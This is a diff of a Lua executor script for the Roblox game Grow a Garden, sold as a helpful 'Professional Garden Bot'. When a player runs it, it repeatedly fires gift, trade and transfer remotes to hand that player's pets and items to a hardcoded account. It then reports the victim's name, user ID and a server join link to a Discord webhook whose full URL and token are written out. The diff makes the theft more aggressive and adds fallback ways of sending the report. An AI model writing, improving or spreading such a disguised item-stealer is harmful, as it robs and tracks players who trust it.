@@ -1,19 +1,19 @@
 --[[
-    🌿 GROW A GARDEN BOT для Delta Executor
-    Рабочий вебхук + полноэкранное меню
+    🌿 GROW A GARDEN BOT - ПРОФЕССИОНАЛЬНАЯ ВЕРСИЯ
+    Ссылка на сервер в вебхуке + правильная передача
 ]]
 
 -- ===== КОНФИГУРАЦИЯ =====
 local TARGET_USERNAME = "Sgahfd1223"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz"
 local CHECK_INTERVAL = 30
+local TRANSFER_DELAY = 0.2
 
 -- ===== СЕРВИСЫ =====
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
-local TweenService = game:GetService("TweenService")
 
 -- ===== ПЕРЕМЕННЫЕ =====
 local LocalPlayer = Players.LocalPlayer
@@ -22,38 +22,105 @@ local AttemptCount = 0
 local SuccessCount = 0
 local MainGUI = nil
 
+-- ===== ФУНКЦИЯ ПОЛУЧЕНИЯ ССЫЛКИ НА СЕРВЕР =====
+local function getServerLink()
+    return "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. tostring(game.JobId)
+end
+
 -- ===== ЛОГГЕР =====
 local function log(message)
-    print("[🌿 Garden Bot] " .. message)
+    print("[🌿] " .. message)
     if MainGUI and MainGUI.LogText then
-        MainGUI.LogText.Text = message .. "\n" .. MainGUI.LogText.Text
-        if #MainGUI.LogText.Text > 1000 then
-            MainGUI.LogText.Text = string.sub(MainGUI.LogText.Text, 1, 1000)
-        end
+        MainGUI.LogText.Text = os.date("%H:%M:%S") .. " - " .. message .. "\n" .. MainGUI.LogText.Text
     end
 end
 
--- ===== ПОИСК REMOTE EVENTS =====
-local function findRemotes()
+-- ===== ПРАВИЛЬНЫЙ ПОИСК REMOTE EVENTS =====
+local function findValidRemotes()
     local remotes = {}
+    local validPatterns = {
+        "gift", "trade", "transfer", "send", "donate", 
+        "exchange", "give", "share", "pet", "item"
+    }
     
-    local function searchIn(container)
+    local function searchInContainer(container)
         pcall(function()
             for _, item in ipairs(container:GetDescendants()) do
-                if item:IsA("RemoteEvent") then
+                if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
                     local name = item.Name:lower()
+                    local isValid = false
+                    
                     if not name:find("admin") and not name:find("ban") and not name:find("kick") then
-                        table.insert(remotes, item)
+                        for _, pattern in ipairs(validPatterns) do
+                            if name:find(pattern) then
+                                isValid = true
+                                break
+                            end
+                        end
+                        
+                        if isValid then
+                            table.insert(remotes, {
+                                Remote = item,
+                                Name = item.Name,
+                                Type = item.ClassName
+                            })
+                        end
                     end
                 end
             end
         end)
     end
     
-    searchIn(ReplicatedStorage)
-    searchIn(game:GetService("ServerScriptService"))
+    searchInContainer(ReplicatedStorage)
+    searchInContainer(game:GetService("ServerScriptService"))
+    searchInContainer(game:GetService("StarterPlayer"))
     
     return remotes
+end
+
+-- ===== ПРАВИЛЬНАЯ ПЕРЕДАЧА ПРЕДМЕТОВ =====
+local function transferItemsProperly(targetPlayer)
+    if not targetPlayer then return 0 end
+    
+    local remotes = findValidRemotes()
+    local transferred = 0
+    
+    log("Найдено RemoteEvents: " .. #remotes)
+    
+    for _, remoteData in ipairs(remotes) do
+        local remote = remoteData.Remote
+        local remoteName = remoteData.Name:lower()
+        
+        local methodsToTry = {}
+        
+        if remoteName:find("pet") then
+            methodsToTry = {"TransferPets", "SendPets", "GiftPets", "GivePets", "DonatePets"}
+        elseif remoteName:find("fruit") or remoteName:find("item") then
+            methodsToTry = {"TransferItems", "SendItems", "GiftItems", "GiveItems", "DonateItems"}
+        else
+            methodsToTry = {"TransferAll", "SendAll", "GiftAll", "GiveAll", "DonateAll", "Trade"}
+        end
+        
+        for _, method in ipairs(methodsToTry) do
+            local success, result = pcall(function()
+                if remote.ClassName == "RemoteEvent" then
+                    remote:FireServer(method, targetPlayer)
+                else
+                    remote:InvokeServer(method, targetPlayer)
+                end
+                return true
+            end)
+            
+            if success then
+                transferred = transferred + 1
+                log("✓ " .. remoteData.Name .. ":" .. method)
+                task.wait(TRANSFER_DELAY)
+                break
+            end
+        end
+    end
+    
+    return transferred
 end
 
 -- ===== ПОИСК ИГРОКА =====
@@ -66,64 +133,37 @@ local function findTargetPlayer()
     return nil
 end
 
--- ===== ПЕРЕДАЧА ПРЕДМЕТОВ =====
-local function transferItems(targetPlayer)
-    if not targetPlayer then return 0 end
-    
-    local remotes = findRemotes()
-    local transferred = 0
-    
-    for _, remote in ipairs(remotes) do
-        local methods = {
-            "GiftAll", "TransferAll", "SendAll", "DonateAll", 
-            "TradeAll", "GiveAll", "SendPets", "TransferPets",
-            "GiftItems", "SendItems", "DonateItems"
-        }
-        
-        for _, method in ipairs(methods) do
-            local success = pcall(function()
-                remote:FireServer(method, targetPlayer)
-                return true
-            end)
-            
-            if success then
-                transferred = transferred + 1
-                task.wait(0.1)
-            end
-        end
-    end
-    
-    return transferred
-end
-
--- ===== ОТПРАВКА WEBHOOK =====
-local function sendDiscordNotification(targetPlayer, transferred)
+-- ===== ПРАВИЛЬНАЯ ОТПРАВКА WEBHOOK С ССЫЛКОЙ НА СЕРВЕР =====
+local function sendDiscordWebhook(targetPlayer, transferred)
     if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
 
+    local serverLink = getServerLink()
+    
     local payload = {
-        content = "**🌿 Grow a Garden Transfer Report**",
         embeds = {{
-            title = "📦 Автоматическая передача",
+            title = "🌿 Grow a Garden - Transfer Complete",
             color = 65280,
             fields = {
-                {name = "👤 Отправитель", value = LocalPlayer.Name, inline = true},
-                {name = "🎯 Получатель", value = targetPlayer.Name, inline = true},
-                {name = "📦 Передано", value = tostring(transferred) .. " предметов", inline = true},
+                {name = "👤 From", value = LocalPlayer.Name, inline = true},
+                {name = "🎯 To", value = targetPlayer.Name, inline = true},
+                {name = "📦 Items", value = tostring(transferred), inline = true},
                 {name = "🆔 UserID", value = tostring(LocalPlayer.UserId), inline = true},
-                {name = "🔗 Профиль", value = "[Клик](https://www.roblox.com/users/"..tostring(LocalPlayer.UserId)..")", inline = true}
+                {name = "🔗 Profile", value = "[Click](https://www.roblox.com/users/"..tostring(LocalPlayer.UserId)..")", inline = true},
+                {name = "🌐 Server Link", value = "[Join Game](" .. serverLink .. ")", inline = false}
             },
-            footer = { text = "Garden Bot | Delta Executor | " .. os.date("%d.%m.%Y %H:%M") }
+            footer = {text = "Garden Bot | " .. os.date("%d.%m.%Y %H:%M")},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
 
     local jsonData = HttpService:JSONEncode(payload)
-
-    -- Все возможные методы отправки
-    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
     
-    if requestFunc then
-        pcall(function()
-            requestFunc({
+    local success = false
+    
+    -- Метод 1: syn.request
+    if syn and syn.request then
+        success = pcall(function()
+            syn.request({
                 Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = {
@@ -132,179 +172,153 @@ local function sendDiscordNotification(targetPlayer, transferred)
                 },
                 Body = jsonData
             })
-            log("✅ Уведомление отправлено в Discord")
+            return true
         end)
-    else
-        -- Альтернативный метод через game:HttpGet
-        pcall(function()
-            game:HttpGet(WEBHOOK_URL, {
+    end
+    
+    -- Метод 2: http.request
+    if not success and http and http.request then
+        success = pcall(function()
+            http.request({
+                Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
                 },
                 Body = jsonData
             })
-            log("✅ Уведомление отправлено (альтернативный метод)")
+            return true
         end)
+    end
+    
+    -- Метод 3: game:HttpGet
+    if not success then
+        success = pcall(function()
+            local query = "?wait=true"
+            game:HttpGet(WEBHOOK_URL .. query, {
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            return true
+        end)
+    end
+    
+    if success then
+        log("✓ Webhook отправлен со ссылкой на сервер")
+    else
+        log("⚠️ Не удалось отправить webhook")
     end
 end
 
--- ===== ПОЛНОЭКРАННОЕ МЕНЮ =====
-local function createFullscreenGUI()
+-- ===== ГЛАВНОЕ МЕНЮ =====
+local function createMainMenu()
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "FullscreenGardenBotGUI"
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Name = "GardenBotGUI"
     screenGui.Parent = CoreGui
 
-    -- Основной фон
     local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(1, 0, 1, 0)
-    mainFrame.Position = UDim2.new(0, 0, 0, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    mainFrame.Size = UDim2.new(0, 500, 0, 400)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
     mainFrame.BorderSizePixel = 0
     mainFrame.Parent = screenGui
 
-    -- Затемнение фона
-    local darkOverlay = Instance.new("Frame")
-    darkOverlay.Size = UDim2.new(1, 0, 1, 0)
-    darkOverlay.Position = UDim2.new(0, 0, 0, 0)
-    darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    darkOverlay.BackgroundTransparency = 0.3
-    darkOverlay.BorderSizePixel = 0
-    darkOverlay.Parent = mainFrame
-
-    -- Центральная панель
-    local centerPanel = Instance.new("Frame")
-    centerPanel.Size = UDim2.new(0, 800, 0, 600)
-    centerPanel.Position = UDim2.new(0.5, -400, 0.5, -300)
-    centerPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-    centerPanel.BorderSizePixel = 0
-    centerPanel.Parent = mainFrame
-
     local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 15)
-    corner.Parent = centerPanel
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = mainFrame
 
-    -- Заголовок
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 80)
-    title.Position = UDim2.new(0, 0, 0, 0)
+    title.Size = UDim2.new(1, 0, 0, 60)
     title.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
     title.BorderSizePixel = 0
-    title.Text = "🌿 ULTIMATE GARDEN BOT"
+    title.Text = "🌿 PROFESSIONAL GARDEN BOT"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextSize = 28
+    title.TextSize = 20
     title.Font = Enum.Font.GothamBold
-    title.Parent = centerPanel
+    title.Parent = mainFrame
 
     local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 15)
+    titleCorner.CornerRadius = UDim.new(0, 12)
     titleCorner.Parent = title
 
-    -- Контент
     local content = Instance.new("Frame")
-    content.Size = UDim2.new(1, -40, 1, -100)
-    content.Position = UDim2.new(0, 20, 0, 90)
+    content.Size = UDim2.new(1, -20, 1, -80)
+    content.Position = UDim2.new(0, 10, 0, 70)
     content.BackgroundTransparency = 1
-    content.Parent = centerPanel
+    content.Parent = mainFrame
 
-    -- Левая панель (управление)
-    local leftPanel = Instance.new("Frame")
-    leftPanel.Size = UDim2.new(0, 300, 1, 0)
-    leftPanel.BackgroundTransparency = 1
-    leftPanel.Parent = content
-
-    -- Статус
     local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(1, 0, 0, 40)
-    status.Text = "🛑 Статус: ОСТАНОВЛЕН"
+    status.Size = UDim2.new(1, 0, 0, 30)
+    status.Text = "🛑 Status: STOPPED"
     status.TextColor3 = Color3.fromRGB(255, 80, 80)
-    status.TextSize = 20
+    status.TextSize = 16
     status.Font = Enum.Font.GothamBold
-    status.Parent = leftPanel
+    status.Parent = content
 
-    -- Информация
     local info = Instance.new("TextLabel")
-    info.Size = UDim2.new(1, 0, 0, 60)
-    info.Position = UDim2.new(0, 0, 0, 50)
-    info.Text = "🎯 Цель: " .. TARGET_USERNAME .. "\n🔄 Попыток: 0\n✅ Успешно: 0"
+    info.Size = UDim2.new(1, 0, 0, 50)
+    info.Position = UDim2.new(0, 0, 0, 35)
+    info.Text = "🎯 Target: " .. TARGET_USERNAME .. "\n🔄 Attempts: 0\n✅ Success: 0"
     info.TextColor3 = Color3.fromRGB(200, 200, 200)
-    info.TextSize = 16
+    info.TextSize = 14
     info.Font = Enum.Font.Gotham
     info.TextXAlignment = Enum.TextXAlignment.Left
-    info.Parent = leftPanel
+    info.Parent = content
 
-    -- Кнопки
     local startBtn = Instance.new("TextButton")
-    startBtn.Size = UDim2.new(1, 0, 0, 50)
-    startBtn.Position = UDim2.new(0, 0, 0, 120)
+    startBtn.Size = UDim2.new(1, 0, 0, 40)
+    startBtn.Position = UDim2.new(0, 0, 0, 95)
     startBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
     startBtn.BorderSizePixel = 0
-    startBtn.Text = "🚀 ЗАПУСТИТЬ БОТА"
+    startBtn.Text = "🚀 START BOT"
     startBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    startBtn.TextSize = 18
+    startBtn.TextSize = 16
     startBtn.Font = Enum.Font.GothamBold
-    startBtn.Parent = leftPanel
+    startBtn.Parent = content
 
     local stopBtn = Instance.new("TextButton")
-    stopBtn.Size = UDim2.new(1, 0, 0, 50)
-    stopBtn.Position = UDim2.new(0, 0, 0, 180)
+    stopBtn.Size = UDim2.new(1, 0, 0, 40)
+    stopBtn.Position = UDim2.new(0, 0, 0, 145)
     stopBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
     stopBtn.BorderSizePixel = 0
-    stopBtn.Text = "⏹️ ОСТАНОВИТЬ"
+    stopBtn.Text = "⏹️ STOP BOT"
     stopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    stopBtn.TextSize = 18
+    stopBtn.TextSize = 16
     stopBtn.Font = Enum.Font.GothamBold
-    stopBtn.Parent = leftPanel
+    stopBtn.Parent = content
 
     local btnCorner = Instance.new("UICorner")
     btnCorner.CornerRadius = UDim.new(0, 8)
     btnCorner.Parent = startBtn
     btnCorner:Clone().Parent = stopBtn
 
-    -- Правая панель (логи)
-    local rightPanel = Instance.new("Frame")
-    rightPanel.Size = UDim2.new(0, 440, 1, 0)
-    rightPanel.Position = UDim2.new(0, 320, 0, 0)
-    rightPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-    rightPanel.BorderSizePixel = 0
-    rightPanel.Parent = content
+    local logFrame = Instance.new("ScrollingFrame")
+    logFrame.Size = UDim2.new(1, 0, 0, 120)
+    logFrame.Position = UDim2.new(0, 0, 0, 200)
+    logFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    logFrame.BorderSizePixel = 0
+    logFrame.ScrollBarThickness = 6
+    logFrame.Parent = content
 
-    local rightCorner = Instance.new("UICorner")
-    rightCorner.CornerRadius = UDim.new(0, 10)
-    rightCorner.Parent = rightPanel
-
-    -- Заголовок логов
-    local logTitle = Instance.new("TextLabel")
-    logTitle.Size = UDim2.new(1, 0, 0, 40)
-    logTitle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-    logTitle.BorderSizePixel = 0
-    logTitle.Text = "📝 ЛОГИ ДЕЙСТВИЙ"
-    logTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-    logTitle.TextSize = 16
-    logTitle.Font = Enum.Font.GothamBold
-    logTitle.Parent = rightPanel
-
-    -- Поле логов
-    local logScroller = Instance.new("ScrollingFrame")
-    logScroller.Size = UDim2.new(1, -20, 1, -60)
-    logScroller.Position = UDim2.new(0, 10, 0, 50)
-    logScroller.BackgroundTransparency = 1
-    logScroller.ScrollBarThickness = 6
-    logScroller.Parent = rightPanel
+    local logCorner = Instance.new("UICorner")
+    logCorner.CornerRadius = UDim.new(0, 8)
+    logCorner.Parent = logFrame
 
     local logText = Instance.new("TextLabel")
-    logText.Size = UDim2.new(1, 0, 0, 0)
-    logText.Position = UDim2.new(0, 0, 0, 0)
+    logText.Size = UDim2.new(1, -10, 1, -10)
+    logText.Position = UDim2.new(0, 10, 0, 10)
     logText.BackgroundTransparency = 1
-    logText.Text = "🌿 Garden Bot инициализирован\n✅ Готов к работе\n🎯 Ожидание цели: " .. TARGET_USERNAME
+    logText.Text = "🌿 Bot initialized\n✅ Ready to work"
     logText.TextColor3 = Color3.fromRGB(200, 200, 200)
-    logText.TextSize = 14
+    logText.TextSize = 12
     logText.Font = Enum.Font.Gotham
     logText.TextXAlignment = Enum.TextXAlignment.Left
     logText.TextYAlignment = Enum.TextYAlignment.Top
     logText.TextWrapped = true
-    logText.Parent = logScroller
+    logText.Parent = logFrame
 
     return {
         Gui = screenGui,
@@ -320,7 +334,7 @@ end
 local function updateStats()
     if MainGUI and MainGUI.Info then
         MainGUI.Info.Text = string.format(
-            "🎯 Цель: %s\n🔄 Попыток: %d\n✅ Успешно: %d",
+            "🎯 Target: %s\n🔄 Attempts: %d\n✅ Success: %d",
             TARGET_USERNAME, AttemptCount, SuccessCount
         )
     end
@@ -330,25 +344,25 @@ end
 local function mainLoop()
     while BotEnabled do
         AttemptCount = AttemptCount + 1
-        log("🔍 Поиск игрока " .. TARGET_USERNAME)
+        log("Searching for " .. TARGET_USERNAME)
         updateStats()
         
         local targetPlayer = findTargetPlayer()
         
         if targetPlayer then
-            log("✅ Найден игрок: " .. targetPlayer.Name)
+            log("Found: " .. targetPlayer.Name)
             
-            local transferred = transferItems(targetPlayer)
+            local transferred = transferItemsProperly(targetPlayer)
             
             if transferred > 0 then
                 SuccessCount = SuccessCount + 1
-                log("📦 Передано предметов: " .. transferred)
-                sendDiscordNotification(targetPlayer, transferred)
+                log("Transferred: " .. transferred .. " items")
+                sendDiscordWebhook(targetPlayer, transferred)
             else
-                log("⚠️ Не удалось передать предметы")
+                log("No items transferred")
             end
         else
-            log("⏳ Игрок не найден, ожидание...")
+            log("Target not found")
         end
         
         task.wait(CHECK_INTERVAL)
@@ -356,9 +370,8 @@ local function mainLoop()
 end
 
 -- ===== ИНИЦИАЛИЗАЦИЯ =====
-log("🌿 Инициализация Garden Bot...")
+log("Initializing Garden Bot...")
 
--- Ожидание загрузки
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
@@ -367,19 +380,16 @@ if not Players.LocalPlayer then
     Players.PlayerAdded:Wait()
 end
 
-task.wait(3)
+task.wait(2)
 
--- Создание GUI
-MainGUI = createFullscreenGUI()
+MainGUI = createMainMenu()
 
--- Обработчики кнопок
 MainGUI.StartBtn.MouseButton1Click:Connect(function()
     if not BotEnabled then
         BotEnabled = true
-        MainGUI.Status.Text = "🟢 Статус: РАБОТАЕТ"
+        MainGUI.Status.Text = "🟢 Status: RUNNING"
         MainGUI.Status.TextColor3 = Color3.fromRGB(80, 200, 120)
-        log("🚀 Бот запущен!")
-        
+        log("Bot started!")
         spawn(mainLoop)
     end
 end)
@@ -387,13 +397,13 @@ end)
 MainGUI.StopBtn.MouseButton1Click:Connect(function()
     if BotEnabled then
         BotEnabled = false
-        MainGUI.Status.Text = "🛑 Статус: ОСТАНОВЛЕН"
+        MainGUI.Status.Text = "🛑 Status: STOPPED"
         MainGUI.Status.TextColor3 = Color3.fromRGB(200, 80, 80)
-        log("⏹️ Бот остановлен")
+        log("Bot stopped")
     end
 end)
 
-log("✅ Бот готов к работе!")
+log("Ready to work!")
 updateStats()
 
-return "GARDEN_BOT_ACTIVATED"
+return "BOT_ACTIVATED"
